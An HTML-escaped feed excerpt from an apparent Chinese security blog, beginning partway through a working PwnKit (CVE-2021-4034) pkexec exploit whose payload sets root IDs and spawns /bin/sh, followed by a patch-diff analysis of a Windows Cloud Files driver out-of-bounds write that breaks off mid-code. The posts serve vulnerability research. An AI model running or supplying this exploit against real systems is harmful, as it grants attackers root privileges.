&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;void gconv_init() {&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34; setuid(0); setgid(0);&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34; seteuid(0); setegid(0);&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34; system(&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; /bin/sh&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">);&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34; exit(0);&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>argv[]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> FILE &lt;span style="color:#f92672">*&lt;/span>fp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">system&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;mkdir -p &amp;#39;GCONV_PATH=.&amp;#39;; touch &amp;#39;GCONV_PATH=./pwnkit&amp;#39;; chmod a+x &amp;#39;GCONV_PATH=./pwnkit&amp;#39;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">system&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;mkdir -p pwnkit; echo &amp;#39;module UTF-8// PWNKIT// pwnkit 1&amp;#39; &amp;gt; pwnkit/gconv-modules&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;pwnkit/pwnkit.c&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;w&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fprintf&lt;/span>(fp, &lt;span style="color:#e6db74">&amp;#34;%s&amp;#34;&lt;/span>, shell);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fclose&lt;/span>(fp);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">system&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>env[] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#e6db74">&amp;#34;pwnkit&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;PATH=GCONV_PATH=.&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;CHARSET=PWNKIT&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;SHELL=pwnkit&amp;#34;&lt;/span>, NULL };
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">execve&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;./pkexec_105&amp;#34;&lt;/span>, (&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>[]){NULL}, env);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞虽然是溢出漏洞，但更类似于逻辑漏洞，不需要为特定操作系统进行布局，只需要构造恶意环境变量组即可注入恶意环境变量，整体利用较为简单。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://xz.aliyun.com/t/10870" target="_blank">https://xz.aliyun.com/t/10870&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank">https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-11-30T14:25:08+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/</link><pubDate>Fri, 24 Nov 2023 15:49:32 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Windows Cloud Files Mini Filter 驱动中存在越界写入漏洞，在解析Reparse point数据时，由于memcpy函数的长度参数用户可控，源内存可控，导致攻击者可以构造恶意结构并传递给Windows Cloud Files Mini Filter 驱动，造成越界写入，并在内核执行任意代码。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;ul>
&lt;li>Windows 10 23年10月补丁&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>cldflt.sys驱动中实现了云文件的各项功能，diff该驱动，修改函数如下：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/1.png" />&lt;/p>
&lt;p>在&lt;code>HsmpRpiDecompressBuffer&lt;/code>函数中有如下修改，对&lt;code>*(_WORD *)(a1 + 10)&lt;/code>添加了一个判断，是否&lt;code>&amp;gt;0x4000&lt;/code>，&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36036-Windows-Cloud-Files-Mini-Filter-Driver-Eop.zh-cn.assets/2.png" />&lt;/p>
&lt;p>如果大于则抛出错误 &lt;code>0xC000CF02&lt;/code>对应 &lt;code>STATUS_CLOUD_FILE_METADATA_CORRUPT&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://endodermis59.rssing.com/chan-36587470/all_p6.html" target="_blank">https://endodermis59.rssing.com/chan-36587470/all_p6.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>AI输出&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>HsmpRpiDecompressBuffer函数的作用是解压压缩后的Reparse Point数据。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>主要功能包括:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1. 校验传入数据的完整性和魔数是否正确
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. 如果数据被压缩,则根据原长度分配解压缓冲区
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. 调用RtlDecompressBuffer进行实际解压
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>4. 检查解压后数据长度是否匹配
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5. 如果解压成功,返回解压后的数据
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>6. 否则返回错误码
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所以它是一个典型的压缩数据解压函数,接收原始压缩数据,校验-&amp;gt;分配缓冲区-&amp;gt;解压-&amp;gt;返回解压后数据的过程。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>通过解压让后续代码可以处理未压缩的Reparse Point数据,一般在需要提交/更新数据时会解压。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>主要作用就是将压缩后的Reparse Point还原为可读的未压缩数据。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>HsmpRpiDecompressBuffer&lt;/code>由 &lt;code>HsmpRpReadBuffer&lt;/code>调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">HsmpRpReadBuffer&lt;/span>(PFLT_INSTANCE Instance, PFILE_OBJECT FileObject, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>a3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OutputBuffer &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#a6e22e">ExAllocatePoolWithTag&lt;/span>(PagedPool, &lt;span style="color:#ae81ff">0x400u&lt;/span>i64, &lt;span style="color:#ae81ff">0x70527348u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> OutputBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">LODWORD&lt;/span>(v9) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HsmpRpiDecompressBuffer&lt;/span>((&lt;span style="color:#66d9ef">__int64&lt;/span>)v8, v6, a3);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HsmDbgBreakOnStatus&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v9);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">int&lt;/span>)v9 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v16 &lt;span style="color:#f92672">=&lt;/span> WPP_GLOBAL_Control;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WPP_GLOBAL_Control &lt;span style="color:#f92672">==&lt;/span> (PDEVICE_OBJECT)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#a6e22e">HIDWORD&lt;/span>(WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Timer) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">BYTE1&lt;/span>(WPP_GLOBAL_Control&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Timer) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v17 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_30;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>a3 &lt;span style="color:#f92672">!=&lt;/span> v8 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_8:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ExFreePoolWithTag&lt;/span>(v8, &lt;span style="color:#ae81ff">0x70527348u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>AI解释&lt;/p>
&lt;pre tabindex="0">&lt;code>这段代码实现了解析和解压Reparse Point数据的功能:
1. 分配OutputBuffer内存用于读取Reparse数据。
2. 调用FltFsControlFile读取Reparse数据到OutputBuffer。
3. 如果读取失败,并且错误码表示buffer太小,则重新分配更大的buffer并重试读取。
4. 调用HsmpRpiDecompressBuffer对读取到的数据进行解压。
5. 如果解压成功,返回解压后的数据,否则返回错误码。
6. 释放原始数据内存。
7. 其中包含了详细的错误和日志记录逻辑。
所以总的来说,这段代码用于从文件系统读取Reparse Point数据,然后对数据进行解压和解析,最后返回解析后的数据。
主要功能聚焦在读取压缩数据并解压这块。
&lt;/code>&lt;/pre>&lt;p>&lt;code>HsmpRpReadBuffer&lt;/code>由 &lt;code>HsmpRpCommitNoLock&lt;/code>和 &lt;code>HsmpSetupContexts&lt;/code>调用。&lt;/p>
&lt;p>&lt;code>HsmpRpCommitNoLock&lt;/code>解释如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>这个C函数实现了HsmpRpCommitNoLock,它似乎是用于在没有锁的情况下提交页面重播(Page Replay)数据。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>主要的逻辑如下:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1. 校验和准备输入数据
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. 分配内存池来存储提交的数据
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. 构建数据结构,填充各种元数据
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>4. 尝试压缩数据
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5. 将数据写入文件
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>6. 清理临时数据结构和内存
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>具体来说,这个函数做了以下工作:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1. 验证输入参数的有效性
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. 为输出缓冲区分配内存
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. 构建输出缓冲区的数据结构
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>4. 填充输出缓冲区的头部
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5. 将输入缓冲区的数据复制到输出缓冲区
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>6. 计算校验和
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7. 尝试压缩输出缓冲区
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8. 标记文件属性
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9. 将输出缓冲区的数据写入文件
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10. 重置文件属性
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>11. 释放临时缓冲区和内存
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所以总的来说,这个函数的主要目的是准备并提交页面重播数据,同时处理必要的校验、压缩和清理工作。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在 &lt;code>HsmpRpCommitNoLock&lt;/code>中有如下代码，可以看到在前面diff中出现的0x4000和0x3FFC，可以猜测漏洞产生于该函数中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>LABEL_156:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PoolWithTag &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#a6e22e">ExAllocatePoolWithTag&lt;/span>(PagedPool, &lt;span style="color:#ae81ff">0x4000u&lt;/span>i64, &lt;span style="color:#ae81ff">0x70527348u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v142 &lt;span style="color:#f92672">=&lt;/span> PoolWithTag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)PoolWithTag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( PoolWithTag )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(PoolWithTag, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x4000u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v57 &lt;span style="color:#f92672">=&lt;/span> InputBuffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v58 &lt;span style="color:#f92672">=&lt;/span> v11 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v8 &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xAu&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v57 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v59 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)(v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v57;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_DWORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">*&lt;/span> v57 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>pReF&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>i64 &lt;span style="color:#f92672">*&lt;/span> v57);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v60 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v59;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( ((v60 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFFFFFFFFFCu&lt;/span>i64) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0x3FFC&lt;/span> )&lt;span style="color:#75715e">// 12 偏移
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v59 &lt;span style="color:#f92672">=&lt;/span> (v60 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFC&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_WORD &lt;span style="color:#f92672">*&lt;/span>)v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) &lt;span style="color:#f92672">|=&lt;/span> &lt;span style="color:#ae81ff">1u&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_WORD &lt;span style="color:#f92672">*&lt;/span>)v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">LODWORD&lt;/span>(v9) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v61 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v59;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_DWORD &lt;span style="color:#f92672">*&lt;/span>)v58 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> v61;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v58[v61] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>继续审查代码，发现在&lt;code>HsmpRpCommitNoLock&lt;/code>中有如下代码，在do while循环中调用memmove函数时，传入的src来源于 &lt;code>HsmpRpReadBuffer&lt;/code>解压后的&lt;code>element[10]&lt;/code>数据，dst为&lt;code>ExAllocatePoolWithTag&lt;/code>分配的大小为0x4000的内存。长度参数来源于&lt;code>ElementInfos[10].Length&lt;/code>，不难看出由此可以造成越界写入，且用户可控。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (v9 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x80000000&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64 )
